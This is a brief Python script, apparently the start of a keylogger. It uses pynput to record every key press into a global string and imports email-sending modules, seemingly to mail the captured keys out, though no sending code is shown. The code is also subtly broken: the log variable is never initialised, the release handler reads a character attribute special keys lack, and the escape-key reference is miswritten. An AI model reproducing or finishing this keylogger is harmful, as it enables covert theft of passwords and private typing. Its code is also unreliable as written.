import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

global keys_pressed

def on_press(key):
    global keys_pressed
    try:
        print(f"Key {key.char} pressed")
        keys_pressed += key.char
    except AttributeError:
        print(f"Special key {key} pressed")

def on_release(key):
    print(f"Key {key.char} released")
    if key == keyboard.key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()